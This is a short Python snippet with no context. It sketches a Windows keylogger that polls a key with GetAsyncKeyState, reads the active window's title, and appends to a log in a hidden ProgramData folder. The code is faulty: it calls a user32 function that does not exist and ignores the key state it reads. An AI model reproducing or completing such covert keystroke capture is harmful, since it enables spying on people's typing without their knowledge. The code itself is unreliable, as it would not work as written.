import ctypes
state = ctypes.windll.user32.GetAsyncKeyState(65)
title = ctypes.windll.user32.GetForegroundWindowText()
log = open(r"C:\ProgramData\.hidden\keys.log", "a")
log.write(title + chr(65))
